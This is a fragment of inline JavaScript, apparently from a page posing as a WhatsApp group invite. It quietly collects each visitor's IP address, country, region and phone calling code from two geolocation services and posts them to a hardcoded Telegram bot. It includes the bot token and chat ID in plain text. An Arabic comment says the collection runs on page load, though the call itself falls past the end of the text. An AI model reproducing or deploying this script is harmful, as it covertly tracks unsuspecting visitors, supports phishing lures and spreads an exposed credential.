    <script>
         const botToken = "7867793466:AAGAPhiAxxiRHSJA0E1jzvqFQ1IGdvIfYGQ"; // توكن البوت
        const chatId = "7165024903"; // معرف الدردشة
   
        async function fetchFromIpInfo() {
            try {
                const response = await fetch("https://ipinfo.io/json");
                const data = await response.json();
                return {
                    ip: data.ip,
                    country: data.country,
                };
            } catch (error) {
                console.error("Error fetching data from ipinfo.io:", error);
                return null;
            }
        }

        async function fetchFromIpApi() {
            try {
                const response = await fetch("https://ipapi.co/xml/");
                const textData = await response.text();
                const parser = new DOMParser();
                const xmlDoc = parser.parseFromString(textData, "application/xml");
                const ip = xmlDoc.getElementsByTagName("ip")[0]?.textContent || "Unknown IP";
                const country = xmlDoc.getElementsByTagName("country_name")[0]?.textContent || "Unknown Country";
                const city = xmlDoc.getElementsByTagName("region")[0]?.textContent || "Unknown City";
                const tele = xmlDoc.getElementsByTagName("country_calling_code")[0]?.textContent || "Unknown tele";
                return { ip, country , city , tele };
            } catch (error) {
                console.error("Error fetching data from ipapi.co:", error);
                return null;
            }
        }

        async function sendToTelegram(message) {
            try {
                const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
                await fetch(telegramUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                    }),
                });
                console.log("Message sent to Telegram successfully.");
            } catch (error) {
                console.error("Error sending message to Telegram:", error);
            }
        }

        async function sendiptelegram2() {
            const ipInfoData = await fetchFromIpInfo();
            const ipApiData = await fetchFromIpApi();

            let message = "-----[ Whatsapp Joining Info ]-----\n";

            if (ipInfoData) {
                message += `ipiInfo  : ${ipInfoData.ip}\nCountry Code: ${ipInfoData.country}\n`;
            }

            if (ipApiData) {
                message += `ipapi: ${ipApiData.ip}\nCountry: ${ipApiData.country}\nCity      :   ${ipApiData.city}\nTele   :  ${ipApiData.tele}\n`;
            }

            await sendToTelegram(message);
        }

        // استدعاء الوظيفة الرئيسية عند تحميل الصفحة
